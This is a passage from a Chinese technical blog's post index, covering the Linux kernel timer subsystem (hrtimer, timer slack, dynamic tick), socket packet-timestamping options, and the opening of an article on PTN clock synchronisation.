tick_period 前 1/2 的时间内执行 tick 工作，并且每个 CPU 的执行间隔是 tick_period / (2N)，见清单 8 所示： 清单 8. hrtimer 在高精度模式下 tick 执行周期的设置 void tick_setup_sched_timer(void) { . . . . / Get the next period (per cpu) / hrtimer_set_expires(&amp;ts-&gt;sched_timer, tick_init_jiffy_update()); offset = ktime_to_ns(tick_period) &gt;&gt; 1; do_div(offset, num_possible_cpus()); offset *= smp_processor_id(); hrtimer_add_expires_ns(&amp;ts-&gt;sched_timer, offset); . . . . } 回到 hrtimer_switch_to_hres 函数中，在一切准备就绪后，调用 retrigger_next_event 激活下一次的 timer 就可以开始正常的运作了。 随着 hrtimer 子系统的发展，一些问题也逐渐暴露了出来。一个比较典型的问题就是 CPU 的功耗问题。现代 CPU 都实现了节能的特性，在没有工作时 CPU 会主动降低频率，关闭 CPU 内部一些非关键模块以达到节能的目的。由于 hrtimer 的精度很高，触发中断的频率也会很高，频繁的中断会极大的影响 CPU 的节能。在这方面 hrtimer 一直在不断的进行调整。以下几个例子都是针对这一问题所做的改进。 schedule_hrtimeout 函数 /** * schedule_hrtimeout - sleep until timeout * @expires: timeout value (ktime_t) * @mode: timer mode, HRTIMER_MODE_ABS or HRTIMER_MODE_REL */ int __sched schedule_hrtimeout(ktime_t *expires, const enum hrtimer_mode mode) schedule_hrtimeout 用来产生一个高精度的调度超时，以 ns 为单位。这样可以更加细粒度的使用内核的调度器。在 Arjan van de Ven 的最初实现中，这个函数有一个很大的问题：由于其粒度很细，所以可能会更加频繁的唤醒内核，导致消耗更多的能源。为了实现既能节省能源，又能确保精确的调度超时，Arjan van de Ven 的办法是将一个超时点变成一个超时范围。设置 hrtimer A 的超时值有一个上限，称为 hard expire，在 hard expire 这个时间点上设置 hrtimer A 的超时中断；同时设置 hrtimer A 的超时值有一个下限，称为 soft expire。在 soft expire 到 hard expire 之间如果有一个 hrtimer B 的中断被触发，在 hrtimer B 的中断处理函数中，内核会检查是否有其他 hrtimer 的 soft expire 超时了，譬如 hrtimer A 的 soft expire 超时了，即使 hrtimer A 的 hard expire 没有到，也可以顺带被处理。换言之，将原来必须在 hard expire 超时才能执行的一个点变成一个范围后，可以尽量把 hrtimer 中断放在一起处理，这样 CPU 被重复唤醒的几率会变小，从而达到节能的效果，同时这个 hrtimer 也可以保证其执行精度。 Deferrable timers &amp; round jiffies 在内核中使用的某些 legacy timer 对于精确的超时值并不敏感，早一点或者晚一点执行并不会产生多大的影响，因此，如果可以把这些对时间不敏感同时超时时间又比较接近的 timer 收集在一起执行，可以进一步减少 CPU 被唤醒的次数，从而达到节能的目地。这正是引入 Deferrable timers 的目地。如果一个 timer 可以被短暂延时，那么可以通过调用 init_timer_deferrable 设置 defer 标记，从而在执行时灵活选择处理方式。不过，如果这些 timers 都被延时到同一个时间点上也不是最优的选择，这样同样会产生 lock 竞争以及 cache-line 的问题。因此，即便将 defer timers 收集到一起，彼此之间也必须稍稍错开一些以防止上述问题。这正是引入 round_jiffies 函数的原因。虽然这样做会使得 CPU 被唤醒的次数稍多一些，但是由于间隔短，CPU 并不会进入很深的睡眠，这个代价还是可以接受的。由于 round_jiffies 需要在每次更新 timer 的超时值（mod_timer）时被调用，显得有些繁琐，因此又出现了更为便捷的 round jiffies 机制，称为 timer slack。Timer slack 修改了 timer_list 的结构定义，将需要偏移的 jiffies 值保存在 timer_list 内部，通过 apply_slack 在每次更新 timer 的过程中自动更新超时值。apply_slack 的实现如清单 9 所示： 清单 9. apply_slack 的实现 /* * Decide where to put the timer while taking the slack into account * * Algorithm: * 1) calculate the maximum (absolute) time * 2) calculate the highest bit where the expires and new max are different * 3) use this bit to make a mask * 4) use the bitmask to round down the maximum time, so that all last * bits are zeros */ static inline unsigned long apply_slack(struct timer_list *timer, unsigned long expires) { unsigned long expires_limit, mask; int bit; expires_limit = expires; if (timer-&gt;slack &gt;= 0) { expires_limit = expires + timer-&gt;slack; } else { unsigned long now = jiffies; / avoid reading jiffies twice / / if already expired, no slack; otherwise slack 0.4% / if (time_after(expires, now)) expires_limit = expires + (expires - now)/256; } mask = expires ^ expires_limit; if (mask == 0) return expires; bit = find_last_bit(&amp;mask, BITS_PER_LONG); mask = (1 &lt;&lt; bit) - 1; expires_limit = expires_limit &amp; ~(mask); return expires_limit; } 随着现代计算机系统的发展，对节能的需求越来越高，尤其是在使用笔记本，手持设备等移动环境是对节能要求更高。Linux 当然也会更加关注这方面的需求。hrtimer 子系统的优化尽量确保在使用高精度的时钟的同时节约能源，如果系统在空闲时也可以尽量的节能，则 Linux 系统的节能优势可以进一步放大。这也是引入 dynamic tick 的根本原因。 回页首 Dynamic tick &amp; tickless 在 dynamic tick 引入之前，内核一直使用周期性的基于 HZ 的 tick。传统的 tick 机制在系统进入空闲状态时仍然会产生周期性的中断，这种频繁的中断迫使 CPU 无法进入更深的睡眠。如果放开这个限制，在系统进入空闲时停止 tick，有工作时恢复 tick，实现完全自由的，根据需要产生 tick 的机制，可以使 CPU 获得更多的睡眠机会以及更深的睡眠，从而进一步节能。dynamic tick 的出现，就是为彻底替换掉周期性的 tick 机制而产生的。周期性运行的 tick 机制需要完成诸如进程时间片的计算，更新 profile，协助 CPU 进行负载均衡等诸多工作，这些工作 dynamic tick 都提供了相应的模拟机制来完成。由于 dynamic tick 的实现需要内核的很多模块的配合，包括了很多实现细节，这里只介绍 dynamic tick 的核心工作机制，以及如何启动和停止 dynamic tick。 Dynamic tick 的核心处理流程 从上文中可知内核时钟子系统支持低精度和高精度两种模式，因此 dynamic tick 也必须有两套对应的处理机制。从清单 5 中可以得知，如果系统支持 hrtimer 的高精度模式，hrtimer 可以在此从低精度模式切换到高精度模式。其实清单 5 还有另外一个重要功能：它也是低精度模式下从周期性 tick 到 dynamic tick 的切换点。如果当前系统不支持高精度模式，系统会尝试切换到 NOHZ 模式，也就是使用 dynamic tick 的模式，当然前提是内核使能了 NOHZ 模式。其核心处理函数如清单 10 所示。这个函数的调用流程如下： tick_check_oneshot_change tick_nohz_switch_to_nohz tick_switch_to_oneshot(tick_nohz_handler) 清单 10. 低精度模式下 dynamic tick 的核心处理函数 static void tick_nohz_handler(struct clock_event_device *dev) { struct tick_sched *ts = &amp;__get_cpu_var(tick_cpu_sched); struct pt_regs *regs = get_irq_regs(); int cpu = smp_processor_id(); ktime_t now = ktime_get(); dev-&gt;next_event.tv64 = KTIME_MAX; if (unlikely(tick_do_timer_cpu == TICK_DO_TIMER_NONE)) tick_do_timer_cpu = cpu; / Check, if the jiffies need an update / if (tick_do_timer_cpu == cpu) tick_do_update_jiffies64(now); /* * When we are idle and the tick is stopped, we have to touch * the watchdog as we might not schedule for a really long * time. This happens on complete idle SMP systems while * waiting on the login prompt. We also increment the “start * of idle” jiffy stamp so the idle accounting adjustment we * do when we go busy again does not account too much ticks. */ if (ts-&gt;tick_stopped) { touch_softlockup_watchdog(); ts-&gt;idle_jiffies++; } update_process_times(user_mode(regs)); profile_tick(CPU_PROFILING); while (tick_nohz_reprogram(ts, now)) { now = ktime_get(); tick_do_update_jiffies64(now); } } 在这个函数中，首先模拟周期性 tick device 完成类似的工作：如果当前 CPU 负责全局 tick device 的工作，则更新 jiffies，同时完成对本地 CPU 的进程时间统计等工作。如果当前 tick device 在此之前已经处于停止状态，为了防止 tick 停止时间过长造成 watchdog 超时，从而引发 soft-lockdep 的错误，需要通过调用 touch_softlockup_watchdog 复位软件看门狗防止其溢出。正如代码中注释所描述的，这种情况有可能出现在启动完毕，完全空闲等待登录的 SMP 系统上。最后需要设置下一次 tick 的超时时间。如果 tick_nohz_reprogram 执行时间超过了一个 jiffy，会导致设置的下一次超时时间已经过期，因此需要重新设置，相应的也需要再次更新 jiffies。这里虽然设置了下一次的超时事件，但是由于系统空闲时会停止 tick，因此下一次的超时事件可能发生，也可能不发生。这也正是 dynamic tick 根本特性。 从清单 7 中可以看到，在高精度模式下 tick_sched_timer 用来模拟周期性 tick device 的功能。dynamic tick 的实现也使用了这个函数。这是因为 hrtimer 在高精度模式时必须使用 one-shot 模式的 tick device，这也同时符合 dynamic tick 的要求。虽然使用同样的函数，表面上都会触发周期性的 tick 中断，但是使用 dynamic tick 的系统在空闲时会停止 tick 工作，因此 tick 中断不会是周期产生的。 Dynamic tick 的开始和停止 当 CPU 进入空闲时是最好的时机。此时可以启动 dynamic tick 机制，停止 tick；反之在 CPU 从空闲中恢复到工作状态时，则可以停止 dynamic tick。见清单 11 所示： 清单 11. CPU 在 idle 时 dynamic tick 的启动 / 停止设置 void cpu_idle(void) { . . . . while (1) { tick_nohz_stop_sched_tick(1); while (!need_resched()) { . . . . } tick_nohz_restart_sched_tick(); } . . . . } 回页首 timer 子系统的初始化过程 在分别了解了内核时钟子系统各个模块后，现在可以系统的介绍内核时钟子系统的初始化过程。系统刚上电时，需要注册 IRQ0 时钟中断，完成时钟源设备，时钟事件设备，tick device 等初始化操作并选择合适的工作模式。由于刚启动时没有特别重要的任务要做，因此默认是进入低精度 + 周期 tick 的工作模式，之后会根据硬件的配置（如硬件上是否支持 HPET 等高精度 timer）和软件的配置（如是否通过命令行参数或者内核配置使能了高精度 timer 等特性）进行切换。在一个支持 hrtimer 高精度模式并使能了 dynamic tick 的系统中，第一次发生 IRQ0 的软中断时 hrtimer 就会进行从低精度到高精度的切换，然后再进一步切换到 NOHZ 模式。IRQ0 为系统的时钟中断，使用全局的时钟事件设备（global_clock_event）来处理的，其定义如下： static struct irqaction irq0 = { .handler = timer_interrupt, .flags = IRQF_DISABLED | IRQF_NOBALANCING | IRQF_IRQPOLL | IRQF_TIMER, .name = “timer” }; 它的中断处理函数 timer_interrupt 的简化实现如清单 12 所示： 清单 12. IRQ0 中断处理函数的简化实现 static irqreturn_t timer_interrupt(int irq, void *dev_id) { . . . . global_clock_event-&gt;event_handler(global_clock_event); . . . . return IRQ_HANDLED; } 在 global_clock_event-&gt;event_handler 的处理中，除了更新 local CPU 上运行进程时间的统计，profile 等工作，更重要的是要完成更新 jiffies 等全局操作。这个全局的时钟事件设备的 event_handler 根据使用环境的不同，在低精度模式下可能是 tick_handle_periodic / tick_handle_periodic_broadcast，在高精度模式下是 hrtimer_interrupt。目前只有 HPET 或者 PIT 可以作为 global_clock_event 使用。其初始化流程清单 13 所示： 清单 13. timer 子系统的初始化流程 void __init time_init(void) { late_time_init = x86_late_time_init; } static __init void x86_late_time_init(void) { x86_init.timers.timer_init(); tsc_init(); } / x86_init.timers.timer_init 是指向 hpet_time_init 的回调指针 / void __init hpet_time_init(void) { if (!hpet_enable()) setup_pit_timer(); setup_default_timer_irq(); } 由清单 13 可以看到，系统优先使用 HPET 作为 global_clock_event，只有在 HPET 没有使能时，PIT 才有机会成为 global_clock_event。在使能 HPET 的过程中，HPET 会同时被注册为时钟源设备和时钟事件设备。 hpet_enable hpet_clocksource_register hpet_legacy_clockevent_register clockevents_register_device(&amp;hpet_clockevent); clockevent_register_device 会触发 CLOCK_EVT_NOTIFY_ADD 事件，即创建对应的 tick device。然后在 tick_notify 这个事件处理函数中会添加新的 tick device。 clockevent_register_device trigger event CLOCK_EVT_NOTIFY_ADD tick_notify receives event CLOCK_EVT_NOTIFY_ADD tick_check_new_device tick_setup_device 在 tick device 的设置过程中，会根据新加入的时钟事件设备是否使用 broadcast 来分别设置 event_handler。对于 tick device 的处理函数，可见图 5 所示： 表 2. tick device 在不同模式下的处理函数 low resolution mode High resolution mode periodic tick tick_handle_periodic hrtimer_interrupt dynamic tick tick_nohz_handler hrtimer_interrupt 另外，在系统运行的过程中，可以通过查看 /proc/timer_list 来显示系统当前配置的所有时钟的详细情况，譬如当前系统活动的时钟源设备，时钟事件设备，tick device 等。也可以通过查看 /proc/timer_stats 来查看当前系统中所有正在使用的 timer 的统计信息。包括所有正在使用 timer 的进程，启动 / 停止 timer 的函数，timer 使用的频率等信息。内核需要配置 CONFIG_TIMER_STATS=y，而且在系统启动时这个功能是关闭的，需要通过如下命令激活“echo 1 &gt;/proc/timer_stats”。/proc/timer_stats 的显示格式如下所示： &lt;count&gt;, &lt;pid&gt; &lt;command&gt; &lt;start_func&gt; (&lt;expire_func&gt;) 回页首 总结 随着应用环境的改变，使用需求的多样化，Linux 的时钟子系统也在不断的衍变。为了更好的支持音视频等对时间精度高的应用，Linux 提出了 hrtimer 这一高精度的时钟子系统，为了节约能源，Linux 改变了长久以来一直使用的基于 HZ 的 tick 机制，采用了 tickless 系统。即使是在对硬件平台的支持上，也是在不断改进。举例来说，由于 TSC 精度高，是首选的时钟源设备。但是现代 CPU 会在系统空闲时降低频率以节约能源，从而导致 TSC 的频率也会跟随发生改变。这样会导致 TSC 无法作为稳定的时钟源设备使用。随着新的 CPU 的出现，即使 CPU 的频率发生变化，TSC 也可以一直维持在固定频率上，从而确保其稳定性。在 Intel 的 Westmere 之前的 CPU 中，TSC 和 Local APIC Timer 类似，都会在 C3+ 状态时进入睡眠，从而导致系统需要切换到其他较低精度的时钟源设备上，但是在 Intel Westmere 之后的 CPU 中，TSC 可以一直保持运行状态，即使 CPU 进入了 C3+ 的睡眠状态，从而避免了时钟源设备的切换。在 SMP 的环境下，尤其是 16-COREs，32-COREs 这样的多 CPU 系统中，每个 CPU 之间的 TSC 很难保持同步，很容易出现“Out-of-Sync”。如果在这种环境下使用 TSC，会造成 CPU 之间的计时误差，然而在 Intel 最新的 Nehalem-EX CPU 中，已经可以确保 TSC 在多个 CPU 之间保持同步，从而可以使用 TSC 作为首选的时钟源设备。由此可见，无论是现在还是将来，只要有需要，内核的时钟子系统就会一直向前发展。 参考资料 “Professional Linux Kernel Architecture”一书以 Linux 2.6.24 为基础全面介绍了 Linux 内核的整体架构和各个子系统模块的组成和实现。 &lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/span&gt;&lt;/p&gt; “Understanding Linux Kernel 3rdversion”一书以 Linux 2.6 内核为基础全面介绍了 Linux 内核的核心组成部分，包括内存管理、VFS、进程管理和调度等，以及内核自 2.6 以来发生的显著变化。 有关 Linux 内核源码，请参考 Linux source code 2.6.34。 Linux symposium 2006 “Hrtimers and Beyond: Transforming the Linux Time Subsystems“讨论了内核 Timing 子系统的发展和变化历程。 在 developerWorks Linux 专区 寻找为 Linux 开发人员（包括 Linux 新手入门）准备的更多参考资料，查阅我们 [最受欢迎的文章和教程。 在 developerWorks 上查阅所有 Linux ](http://www.ibm.com/developerworks/cn/linux/best2009/index.html)技巧 和 Linux 教程。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"SO_TIMESTAMP - 《Unix网络编程》中未提及的Socket选项","slug":"EMBEDDED/so-timestamp-e3-80-8aunix-e7-bd-91-e7-bb-9c-e7-bc-96-e7-a8-8b-e3-80-8b-e4-b8-ad-e6-9c-aa-e6-8f-90-e5-8f-8a-e7-9a-84socket-e9-80-89-e9-a1-b9","date":"2016-05-26T03:37:11.000Z","updated":"2017-07-10T08:51:39.658Z","comments":true,"path":"EMBEDDED/so-timestamp-e3-80-8aunix-e7-bd-91-e7-bb-9c-e7-bc-96-e7-a8-8b-e3-80-8b-e4-b8-ad-e6-9c-aa-e6-8f-90-e5-8f-8a-e7-9a-84socket-e9-80-89-e9-a1-b9.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/so-timestamp-e3-80-8aunix-e7-bd-91-e7-bb-9c-e7-bc-96-e7-a8-8b-e3-80-8b-e4-b8-ad-e6-9c-aa-e6-8f-90-e5-8f-8a-e7-9a-84socket-e9-80-89-e9-a1-b9.html","excerpt":"在setsockopt函数中常用Socket选项对socket进行一些必要的设置，使socket可以按我们预期的特性去工作。 SO_TIMESTAMP，一个Socket选项，在权威著作《Unix网络编程》中未提及到，即使在google上也难找到其详","text":"在setsockopt函数中常用Socket选项对socket进行一些必要的设置，使socket可以按我们预期的特性去工作。 SO_TIMESTAMP，一个Socket选项，在权威著作《Unix网络编程》中未提及到，即使在google上也难找到其详细解释与用法。然而在开源代码ptpv2d-rc1中用到了这个socket选项，那么它到底是用来做什么的呢。 分析过linux-2.6.32内核源码后，发现通过设置此选项，我们可以让内核协议栈在接受到一个网络帧时为其打上时间戳，并将此时间戳作为一笔附加数据，与网络帧数据一起递交到上层协议。 netif_receive_skb()，linux内核协议栈中的关键函数，通常在网卡驱动程序poll函数（RX中断处理函数会调度poll函数，详情参考最新内核机制NAPI）的最后一步调用，占们用来处理网络帧，并将网络帧递交至上层协议，而netif_receive_skb函数第一件要做的事就是调用net_timestamp，为当前收到的网络帧打时间戳（net_timestamp函数里会判断是否已经使能了网络时间戳功能，即netstamp_need），并将此时间戳作为一笔SCM_TIMESTAMP类型的附加数据插入sk_buff（即cmsg）。 上层代码如果要获取内核协议栈为网络帧打的时间戳，就需要拿到附加数据，很显然，我们要拿的是SCM_TIMESTAMP类型的附加数据。 我们要在收到的报文中遍历附加数据（可能有很多笔附加数据），可以使用CMSG_FIRSTHDR()与CMSG_NXTHDR()宏在附加数据对象中进行遍历，if(cmsg-&gt;cmsg_level == SOL_SOCKET &amp;&amp; cmsg-&gt;cmsg_type == SCM_TIMESTAMP)条件一旦成立，就表明已经找到了SCM_TIMESTAMP类型的附加数据，那就是之前内核协议栈为这一帧网络报文打上的时间戳，也就是收到此网络报文的时间。 这个特性在PTP协议中非常有用，要做网络时间同步，必须有办法知道网络报文收到的时间，如果没有硬件时间戳（精密PHY），上层应用程序就需要使用此特性获取网络帧收到时的时间戳，或者自己编写内核模块代码接入底层协议栈，加盖软件时间戳。 分为几个部分阐述 1、linux时间系统 2、网卡工作原理 3、socket编程里的硬件时间戳选项 4、网络硬时间戳是什么时候打？在哪儿打的？ 一、linux时间系统 陈莉君《深入分析linux内核源码》一篇很不错的文章：linux时间系统 linux有两个时钟源，分别是RTC和OS时钟。 RTC独立于操作系统，由电池供电，即使系统断电它也能维护自己的时钟。LINUX系统启动时从其中获得时间初始值。 OS时钟从可编程计数器（如intel的8524）获得时钟。如图1所示的输出脉冲是OS时钟工作的基础，因为是由它产生时钟中断的。 图1 8524工作示意图 图1 时钟机制 二、网卡工作原理 发送数据时，网卡首先侦听介质上是否有载波（载波由电压指示），如果有，则认为其他站点正在传送信息，继续侦听介质。一旦通信介质在一定时间段内（称为帧间缝隙IFG=9.6微秒）是安静的，即没有被其他站点占用，则开始进行帧数据发送，同时继续侦听通信介质，以检测冲突。在发送数据期间。 如果检测到冲突，则立即停止该次发送，并向介质发送一个”阻塞”信号，告知其他站点已经发生冲突，从而丢弃那些可能一直在接收的受到损坏的帧数据，并等待一段随机时间（CSMA/CD确定等待时间的算法是二进制指数退避算法）。在等待一段随机时间后，再进行新的发送。如果重传多次后（大于16次）仍发生冲突，就放弃发送。 接收时，网卡浏览介质上传输的每个帧，如果其长度小于64字节，则认为是冲突碎片。如果接收到的帧不是冲突碎片且目的地址是本地地址，则对帧进行完整性校验，如果帧长度大于1518字节（称为超长帧，可能由错误的LAN驱动程序或干扰造成）或未能通过CRC校验，则认为该帧发生了畸变。通过校验的帧被认为是有效的，网卡将它接收下来进行本地处理。 linux网卡驱动程序框架 三、socket编程里的硬件时间戳选项 参考文章：硬件时间戳socket选项解析 The existing interfaces for getting network packages time stamped are: * SO_TIMESTAMP Generate time stamp for each incoming packet using the (not necessarily monotonous!) system time. Result is returned via recv_msg() in a control message as timeval_r(usec resolution). * SO_TIMESTAMPNS Same time stamping mechanism as SO_TIMESTAMP, but returns result as timespec (nsec resolution). * IP_MULTICAST_LOOP + SO_TIMESTAMP[NS] Only for multicasts: approximate send time stamp by receiving the looped packet and using its receive time stamp. The following interface complements the existing ones: receive time stamps can be generated and returned for arbitrary packets and much closer to the point where the packet is really sent. Time stamps can be generated in software (as before) or in hardware (if the hardware has such a feature). SO_TIMESTAMPING: Instructs the socket layer which kind of information is wanted. The parameter is an integer with some of the following bits set. Setting other bits is an error and doesn’t change the current state. SOF_TIMESTAMPING_TX_HARDWARE: try to obtain send time stamp in hardware SOF_TIMESTAMPING_TX_SOFTWARE: if SOF_TIMESTAMPING_TX_HARDWARE is off or fails, then do it in software SOF_TIMESTAMPING_RX_HARDWARE: return the original, unmodified time stamp as generated by the hardware SOF_TIMESTAMPING_RX_SOFTWARE: if SOF_TIMESTAMPING_RX_HARDWARE is off or fails, then do it in software SOF_TIMESTAMPING_RAW_HARDWARE: return original raw hardware time stamp SOF_TIMESTAMPING_SYS_HARDWARE: return hardware time stamp transformed to the system time base SOF_TIMESTAMPING_SOFTWARE: return system time stamp generated in software SOF_TIMESTAMPING_TX/RX determine how time stamps are generated. SOF_TIMESTAMPING_RAW/SYS determine how they are reported in the following control message: struct scm_timestamping { struct timespec systime; struct timespec hwtimetrans; struct timespec hwtimeraw; }; recvmsg() can be used to get this control message for regular incoming packets. For send time stamps the outgoing packet is looped back to the socket’s error queue with the send time stamp(s) attached. It can be received with recvmsg(flags=MSG_ERRQUEUE). The call returns the original outgoing packet data including all headers preprended down to and including the link layer, the scm_timestamping control message and a sock_extended_err control message with ee_errno==ENOMSG and ee_origin==SO_EE_ORIGIN_TIMESTAMPING. A socket with such a pending bounced packet is ready for reading as far as select() is concerned. If the outgoing packet has to be fragmented, then only the first fragment is time stamped and returned to the sending socket. All three values correspond to the same event in time, but were generated in different ways. Each of these values may be empty (= all zero), in which case no such value was available. If the application is not interested in some of these values, they can be left blank to avoid the potential overhead of calculating them. systime is the value of the system time at that moment. This corresponds to the value also returned via SO_TIMESTAMP[NS]. If the time stamp was generated by hardware, then this field is empty. Otherwise it is filled in if SOF_TIMESTAMPING_SOFTWARE is set. hwtimeraw is the original hardware time stamp. Filled in if SOF_TIMESTAMPING_RAW_HARDWARE is set. No assumptions about its relation to system time should be made. hwtimetrans is the hardware time stamp transformed so that it corresponds as good as possible to system time. This correlation is not perfect; as a consequence, sorting packets received via different NICs by their hwtimetrans may differ from the order in which they were received. hwtimetrans may be non-monotonic even for the same NIC. Filled in if SOF_TIMESTAMPING_SYS_HARDWARE is set. Requires support by the network device and will be empty without that support. SIOCSHWTSTAMP: Hardware time stamping must also be initialized for each device driver that is expected to do hardware time stamping. The parameter is defined in /include/linux/net_tstamp.h as: struct hwtstamp_config { int flags; int tx_type; int rx_filter; }; Desired behavior is passed into the kernel and to a specific device by calling ioctl(SIOCSHWTSTAMP) with a pointer to a struct ifreq whose ifr_data points to a struct hwtstamp_config. The tx_type and rx_filter are hints to the driver what it is expected to do. If the requested fine-grained filtering for incoming packets is not supported, the driver may time stamp more than just the requested types of packets. A driver which supports hardware time stamping shall update the struct with the actual, possibly more permissive configuration. If the requested packets cannot be time stamped, then nothing should be changed and ERANGE shall be returned (in contrast to EINVAL, which indicates that SIOCSHWTSTAMP is not supported at all). Only a processes with admin rights may change the configuration. User space is responsible to ensure that multiple processes don’t interfere with each other and that the settings are reset. enum { HWTSTAMP_TX_OFF, HWTSTAMP_TX_ON, }; enum { HWTSTAMP_FILTER_NONE, HWTSTAMP_FILTER_ALL, HWTSTAMP_FILTER_SOME, HWTSTAMP_FILTER_PTP_V1_L4_EVENT, }; DEVICE IMPLEMENTATION A driver which supports hardware time stamping must support the SIOCSHWTSTAMP ioctl and update the supplied struct hwtstamp_config with the actual values as described in the section on SIOCSHWTSTAMP. Time stamps for received packets must be stored in the skb. To get a pointer to the shared time stamp structure of the skb call skb_hwtstamps(). Then set the time stamps in the structure: struct skb_shared_hwtstamps { ktime_t hwtstamp; ktime_t syststamp; }; Time stamps for outgoing packets are to be generated as follows: - In hard_start_xmit(), check if skb_tx(skb)-&gt;hardware is set no-zero. If yes, then the driver is expected to do hardware time stamping. - If this is possible for the skb and requested, then declare that the driver is doing the time stamping by setting the field skb_tx(skb)-&gt;in_progress non-zero. You might want to keep a pointer to the associated skb for the next step and not free the skb. A driver not supporting hardware time stamping doesn’t do that. A driver must never touch sk_buff::tstamp! It is used to store software generated time stamps by the network subsystem. - As soon as the driver has sent the packet and/or obtained a hardware time stamp for it, it passes the time stamp back by calling skb_hwtstamp_tx() with the original skb, the raw hardware time stamp. skb_hwtstamp_tx() clones the original skb and adds the timestamps, therefore the original skb has to be freed now. If obtaining the hardware time stamp somehow fails, then the driver should not fall back to software time stamping. The rationale is that this would occur at a later time in the processing pipeline than other software time stamping and therefore could lead to unexpected deltas between time stamps. - If the driver did not call set skb_tx(skb)-&gt;in_progress, then dev_hard_start_xmit() checks whether software time stamping is wanted as fallback and potentially generates the time stamp. 四、 linux如何获取高精度时间 在linux下通常可用的精度最高的时间接口是gettimeofday，它返回一个timeval结构，其精度为us，即10-6 秒，大多数情况这个精度已经够用了。不过有时为了更高的精度，比如纳秒级的时间精度，我们需求探索Linux为我们提供的时间调用。 首先介绍struct timespec结构，这个结构体有两个成员，一个是秒，一个是纳秒。 在librt库中，提供了高精度的时间函数，分别是： long clock_gettime(clockid_t ,struct timespec*) 获取特定时钟的时间，时间通过fp结构传回，目前定义了6种时钟，分别是 CLOCK_REALTIME 系统当前时间，从1970年1.1日算起 CLOCK_MONOTONIC 系统的启动时间，不能被设置 CLOCK_PROCESS_CPUTIME_ID 进程运行时间 CLOCK_THREAD_CPUTIME_ID 线程运行时间 CLOCK_REALTIME_HR CLOCK_REALTIME的高精度版本 CLOCK_MONOTONIC_HR CLOCK_MONOTONIC的高精度版本 获取特定时钟的时间精度： long clock_getres(clockid_t ) 设置特定时钟的时间： long clock_settime(clockid_t ,struct timespec*) 休眠time中指定的时间，如果遇到信号中断而提前返回，则由left_time返回剩余的时间： long clock_nanosleep(clockid_t ,int flag,timespec time,timespec left_time) 五、硬时间戳模块的物理实现 基于硬件时间戳的IEEE1588时间同步技术的一种实现方法 本地时间戳模块的计数器的工作频率越高，本地 时间戳的分辨率就越高。但在实际的工程中，这个频率受 FPGA器件本身的性能和本地晶振的限制，不可能无限制的 提高，否则不仅不能提高同步性能，甚至还会因为系统达 不到这个频率而无法正常工作。进而影响开发进度和开发 成本。本文采用FPGA设计硬件时间戳模块，在MAC和PHY 之间的GMlI接口处打时间戳，也就是图6所示的C点，图7 为硬件时间戳模块框图。 50Mhz晶振接入FPGA，经过FPGA内部的DCM倍频至 1OOMhz作为本地时间计数器的It,-t~~信号clk。在每个clk的 上升沿累加，每次累加值为1 Ons，也就是本地时间戳的分 辨率是1 Ons。开始上电时，时间戳模块需要初始时间，由 CPU发出更新时间的命令并将要更新的时间写入更新时间 寄存器，时间戳模块就能更新本地时间，然后在此基础上 开始累加。当CPU发出调整本地时间命令时，时间戳模块 通过读取时间偏差调整寄存器来更新本地时间以同步于主 时钟。该时间戳模块按照IEEE1 588的标准时间格式输出本 地时间供需要时间戳的模块使用。 拓展文献 1.[基于IEEE1588协议的时间戳的生成与分析 2.浅谈时间函数gettimeofday的成本 3. linux 2.6](http://wenku.baidu.com/link?url=MlUag6NhaBAAl30w4-SFjWftYQRs9lwcCiA59tmgSXDMRU2xDWdRkvSlg2kfMTYvvtAjZfT7SMz85t0FxMHZFHBA8p8IlOoBl6JVttmFYi_)的网络时间戳","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"PTN时钟同步技术及应用","slug":"EMBEDDED/PTN时钟同步技术及应用","date":"2016-05-25T05:53:05.000Z","updated":"2017-07-10T08:51:11.396Z","comments":true,"path":"EMBEDDED/PTN时钟同步技术及应用.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/PTN时钟同步技术及应用.html","excerpt":"PTN Clock Synchronization Technology and Its Application 2010-06-03 作者:李勤 摘要:时钟同步是分组传送网(PTN)需要考虑的重要问题之一。可以采用同步以太网、IEEE 1","text":"PTN Clock Synchronization Technology and Its Application 2010-06-03 作者:李勤 摘要:时钟同步是分组传送网(PTN)需要考虑的重要问题之一。可以采用同步以太网、IEEE 1588v2、网络时间协议(NTP)等多种技术实现时钟同步。同步以太网标准的同步状态信息(SSM)算法存在时钟成环，以及难以对节点跟踪统计的问题。中兴通讯提出了一种扩展SSM算法可以改进时钟同步问题。在时间同步方面，由于NTP的精度还无法满足电信网的需求，仅采用1588v2又会带来收敛时间较慢、在网络负载较重时时间延迟精度容易受到影响等问题。中兴通讯提出了同步以太网基础的1588v2时间传递方案，对提高PTN网络中时间同步的精度起到了较好的作用。 关键字:分组传送网；同步以太网；时间同步；延迟 英文摘要:Clock synchronization is an important issue in Packet Transport Networking (PTN). Current clock synchronization technologies include synchronous Ethernet, IEEE 1588v2, and Network Time Protocol (NTP). However, challenges such as clock ring and difficulty tracing and counting nodes have arisen in Synchronous Ethernet standard Synchronization Status Message (SSM) algorithm. ZTE therefore proposes using an extended SSM algorithm. In time synchronization, the accuracy of NTP cannot meet the needs of telecommunication networks, and only using 1588v2 slows convergence time. The precision for time delay is easily affected when the network is heavily loaded. ZTE proposes a 1588v2 scheme based on synchronous Ethernet in order to effectively raise the precision of PTN time synchronization. 英文关键字:PTN; synchronous ethernet; time synchronization; delay 当运营商对分组传送网(PTN)取代传统时分复用(TDM)传输网的需求日益明显时，如何解决时钟同步成为重要问题之一。对分组传送网的同步需求有两个方面：一是可以承载TDM业务并提供TDM业务时钟恢复的机制，使得TDM业务在穿越分组网络后仍满足一定的性能指标(如ITU-T G.823/G.824规范)；二是分组网络可以像TDM网络一样，提供高精度的网络参考时钟，满足网络节点(如基站)的同步需求。 1 同步技术 时钟同步包括：频率同步和时间同步。频率同步要求相同的时间间隔，时间同步要求时间的起始点相同和相同的时间间隔。 无线技术不同制式对时钟的承载有不同的需求，GSM/WCDMA采用的是异步基站技术，只需要做频率同步，精度要求0.05 